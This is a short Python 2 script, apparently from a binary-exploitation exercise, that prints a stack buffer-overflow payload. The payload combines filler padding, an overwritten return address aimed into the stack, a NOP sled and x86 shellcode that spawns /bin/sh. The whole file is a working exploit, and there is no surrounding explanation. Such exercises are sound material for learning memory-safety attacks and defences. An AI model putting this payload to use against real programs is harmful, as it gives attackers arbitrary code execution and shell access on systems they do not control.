#!/usr/bin/env python2
import struct

# padding for return address
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
# return address should point to somewhere on the stack, in the middle of NOP sled
eip = struct.pack("I", 0xbffffcc0+0x30)
# nops = "\x90"*100+"\xcc"*4    # add nop sled and INT3 for checking if stack is executable
# nop sled
nops = "\x90" * 100
# shellcode for executin /bin/sh
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding+eip+nops+payload
